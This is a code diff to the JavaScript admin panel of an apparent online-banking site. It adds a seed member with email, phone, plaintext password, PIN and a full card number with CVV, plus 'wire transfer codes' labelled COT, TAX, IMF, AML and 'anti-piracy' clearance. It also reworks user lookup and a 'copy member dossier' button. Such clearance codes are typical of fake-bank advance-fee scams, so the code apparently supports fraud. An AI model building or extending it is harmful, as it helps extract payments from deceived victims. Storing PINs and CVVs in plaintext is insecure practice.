@@ -151,12 +151,58 @@ export const initialSeedUsers = [
     activityLog: []
   },
   {
+    id: 'usr-34400',
+    fullName: 'Kristin Willis',
+    firstName: 'Kristin',
+    lastName: 'Willis',
+    username: 'kwillis',
+    email: 'debstarnetwork@gmail.com',
+    password: 'MemberPass123!',
+    pin: '8869',
+    transactionPin: '8869',
+    role: 'Member',
+    is_admin: false,
+    phone: '9377334076',
+    avatar: 'KW',
+    avatarColor: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
+    dob: '1988-03-24',
+    nationality: 'United States',
+    address: '742 Evergreen Terrace, Springfield, OR 97477',
+    status: 'active',
+    account_status: 'active',
+    accountStatus: 'active',
+    statusReason: 'Account Active & Verified',
+    kycStatus: 'verified',
+    kyc_status: 'verified',
+    createdAt: '2026-10-13T10:00:00Z',
+    lastLogin: new Date().toISOString(),
+    accounts: [
+      { accountNumber: '09331164041', type: 'Checking', name: 'Premier Checking Account', currency: 'USD', balance: 0.00, status: 'active', routingNumber: '021000089', isPrimary: true }
+    ],
+    transactions: [],
+    cards: [
+      { id: 'crd-34400', cardNumber: '4532 9918 2041 3310', cardHolder: 'KRISTIN WILLIS', type: 'Visa Platinum Debit', expiry: '09/31', cvv: '884', pin: '8869', status: 'active', dailyAtmLimit: 10000, onlineLimit: 50000 }
+    ],
+    cryptoWallets: [
+      { currency: 'BTC', balance: 0.00, address: 'bc1q9x48v2m9sl3k0pw84mz789xq4e9', status: 'active' }
+    ],
+    wireTransferCodes: {
+      COT: { code: '0467799', active: true, notes: 'Cost of Transfer clearance token' },
+      TAX: { code: 'TX-88392', active: true, notes: 'Tax Clearance certificate' },
+      IMF: { code: '9498779', active: true, notes: 'IMF Clearance signoff' },
+      AML: { code: 'AML-86902', active: true, notes: 'Anti-Money Laundering key' },
+      PAP: { code: 'PAP-70216', active: true, notes: 'Proof of Anti-Piracy clearance' },
+      OTP: '806158'
+    },
+    activityLog: []
+  },
+  {
     id: 'usr-659',
     fullName: 'Olle Robert Christer Råström',
     firstName: 'Olle Robert Christer',
     lastName: 'Råström',
     username: 'ollerobertrstrm52',
-    email: 'debstarnetwork@gmail.com',
+    email: 'olle.rastrom@swissprivatevault.ch',
     password: 'Password123!',
     pin: '8869',
     transactionPin: '8869',
@@ -668,35 +714,22 @@ export function getAdminUsersList() {
     if (!primary.password) primary.password = '12345';
   }
 
-  // Ensure all initialSeedUsers (including Olle Robert Christer Råström) are present
+  // Ensure all initialSeedUsers are present without ever overwriting custom member records
   initialSeedUsers.forEach((seedUser) => {
     const foundIdx = list.findIndex((u) => u.id === seedUser.id || (u.email && seedUser.email && u.email.toLowerCase() === seedUser.email.toLowerCase()));
     if (foundIdx === -1) {
       list.push(JSON.parse(JSON.stringify(seedUser)));
     } else {
-      // Merge missing wireTransferCodes, cards, or account details from seed if needed
+      // Only backfill missing codes, accounts, or cards if user lacks them
       const existing = list[foundIdx];
-      if (seedUser.id === 'usr-659') {
-        existing.id = seedUser.id;
-        existing.fullName = seedUser.fullName;
-        existing.username = seedUser.username;
-        existing.email = seedUser.email;
-        existing.phone = seedUser.phone;
-        existing.address = seedUser.address;
-        existing.nationality = seedUser.nationality;
-        existing.pin = seedUser.pin;
-        existing.transactionPin = seedUser.transactionPin;
-        existing.status = seedUser.status;
-        existing.kycStatus = seedUser.kycStatus;
-        if (!existing.wireTransferCodes || Object.keys(existing.wireTransferCodes).length === 0) {
-          existing.wireTransferCodes = seedUser.wireTransferCodes;
-        }
-        if (!existing.accounts || existing.accounts.length === 0) {
-          existing.accounts = seedUser.accounts;
-        }
-        if (!existing.cards || existing.cards.length === 0) {
-          existing.cards = seedUser.cards;
-        }
+      if (!existing.wireTransferCodes || Object.keys(existing.wireTransferCodes).length === 0) {
+        existing.wireTransferCodes = seedUser.wireTransferCodes;
+      }
+      if (!existing.accounts || existing.accounts.length === 0) {
+        existing.accounts = seedUser.accounts;
+      }
+      if (!existing.cards || existing.cards.length === 0) {
+        existing.cards = seedUser.cards;
       }
     }
   });
@@ -821,24 +854,6 @@ export function ensureUserHasUniqueCodesAndAccounts(user, persist = false) {
     }
   }
 
-  if (modified && persist) {
-    try {
-      const stored = localStorage.getItem(ADMIN_USERS_STORAGE_KEY);
-      if (stored) {
-        const allUsers = JSON.parse(stored);
-        if (Array.isArray(allUsers)) {
-          const idx = allUsers.findIndex(u => u.id === user.id);
-          if (idx !== -1) {
-            allUsers[idx] = user;
-            saveAdminUsersList(allUsers);
-          }
-        }
-      }
-    } catch (e) {
-      console.warn('Sync user codes update note:', e);
-    }
-  }
-
   return user;
 }
 
@@ -859,8 +874,16 @@ export function saveAdminUsersList(users) {
 }
 
 export function getUserById(userId) {
-  const users = getAdminUsersList();
-  const user = users.find((u) => u.id === userId) || null;
+  if (!userId) return null;
+  const matchId = String(userId).trim();
+  let user = (typeof currentUsers !== 'undefined' && Array.isArray(currentUsers))
+    ? currentUsers.find((u) => u && (u.id === matchId || String(u.id) === matchId || (u.email && u.email.toLowerCase() === matchId.toLowerCase())))
+    : null;
+
+  if (!user) {
+    const users = getAdminUsersList();
+    user = (users || []).find((u) => u && (u.id === matchId || String(u.id) === matchId || (u.email && u.email.toLowerCase() === matchId.toLowerCase()))) || null;
+  }
   return user ? ensureUserHasUniqueCodesAndAccounts(user) : null;
 }
 
@@ -1670,7 +1693,9 @@ export function copyUserDossierToClipboard(userId, btnEl) {
   const text = formatUserDossier(user);
   copyTextToClipboard(text).then(() => {
     showToast(`Full member details & wire codes for ${user.fullName} copied to clipboard!`, 'success', 'Dossier Copied');
-    alert(`📋 MEMBER DOSSIER COPIED TO CLIPBOARD:\n\n` + text);
+    try {
+      alert(`📋 MEMBER DOSSIER COPIED TO CLIPBOARD:\n\n` + text);
+    } catch (e) {}
   });
 
   if (btnEl) {
@@ -1745,7 +1770,56 @@ export function approveUserAccount(userId) {
 
   renderUsersTable();
   showToast(`Account for ${user.fullName} has been approved and activated.`, 'success', 'Account Activated');
-  alert(`✓ ACCOUNT APPROVED & ACTIVATED!\n\nMember Name: ${user.fullName}\nStatus: ACTIVE\nKYC Tier: Level 3 Verified\nAccount Number: ${user.accounts?.[0]?.accountNumber || 'N/A'}\n\nThe member account is now fully active.`);
+  try {
+    alert(`✓ ACCOUNT APPROVED & ACTIVATED!\n\nMember Name: ${user.fullName}\nStatus: ACTIVE\nKYC Tier: Level 3 Verified\nAccount Number: ${user.accounts?.[0]?.accountNumber || 'N/A'}\n\nThe member account is now fully active.`);
+  } catch (e) {}
+}
+
+// Global top-level bindings for window execution
+if (typeof window !== 'undefined') {
+  window.openUserDetailDrawer = openUserDetailDrawer;
+  window.closeUserDetailDrawer = closeUserDetailDrawer;
+  window.approveUserAccount = approveUserAccount;
+  window.copyUserDossierToClipboard = copyUserDossierToClipboard;
+
+  document.addEventListener('click', (e) => {
+    // 1. Approve Button Click
+    const approveBtn = e.target.closest('.btn-approve-user, [data-action="approve-user"]');
+    if (approveBtn) {
+      e.preventDefault();
+      e.stopPropagation();
+      const uId = approveBtn.getAttribute('data-user-id');
+      if (uId) approveUserAccount(uId);
+      return;
+    }
+
+    // 2. Copy Info Button Click
+    const copyBtn = e.target.closest('.btn-copy-user-details, [data-action="copy-user"]');
+    if (copyBtn) {
+      e.preventDefault();
+      e.stopPropagation();
+      const uId = copyBtn.getAttribute('data-user-id');
+      if (uId) copyUserDossierToClipboard(uId, copyBtn);
+      return;
+    }
+
+    // 3. Manage Button Click
+    const viewBtn = e.target.closest('.btn-view-user, [data-action="view-user"]');
+    if (viewBtn) {
+      e.preventDefault();
+      e.stopPropagation();
+      const uId = viewBtn.getAttribute('data-user-id');
+      if (uId) openUserDetailDrawer(uId);
+      return;
+    }
+
+    // 4. User Row Click
+    const userRow = e.target.closest('.admin-user-row');
+    if (userRow && !e.target.closest('button, input, select, a, td.text-right')) {
+      const uId = userRow.getAttribute('data-user-id');
+      if (uId) openUserDetailDrawer(uId);
+    }
+  });
 }
 
 /* ----------------------------------------------------------------------------
@@ -1779,6 +1853,7 @@ function setupUserDetailDrawer() {
   setupDrawerActionButtons();
   if (typeof window !== 'undefined') {
     window.openUserDetailDrawer = openUserDetailDrawer;
+    window.closeUserDetailDrawer = closeUserDetailDrawer;
     window.approveUserAccount = approveUserAccount;
     window.copyUserDossierToClipboard = copyUserDossierToClipboard;
   }
@@ -1786,15 +1861,24 @@ function setupUserDetailDrawer() {
 
 export function openUserDetailDrawer(userId) {
   const user = getUserById(userId);
-  if (!user) return;
+  if (!user) {
+    console.warn('[ADMIN DRAWER] User not found for ID:', userId);
+    return;
+  }
 
   activeDetailUser = user;
   const overlay = document.getElementById('adminDrawerOverlay');
   const panel = document.getElementById('adminDrawerPanel');
 
-  if (overlay && panel) {
+  if (overlay) {
     overlay.classList.add('show');
-    panel.classList.add('open');
+    overlay.style.display = 'block';
+  }
+  if (panel) {
+    panel.style.display = 'flex';
+    requestAnimationFrame(() => {
+      panel.classList.add('open');
+    });
   }
 
   // Populate Header
@@ -1851,8 +1935,11 @@ export function openUserDetailDrawer(userId) {
 export function closeUserDetailDrawer() {
   const overlay = document.getElementById('adminDrawerOverlay');
   const panel = document.getElementById('adminDrawerPanel');
-  if (overlay && panel) {
+  if (overlay) {
     overlay.classList.remove('show');
+    overlay.style.display = 'none';
+  }
+  if (panel) {
     panel.classList.remove('open');
   }
 }
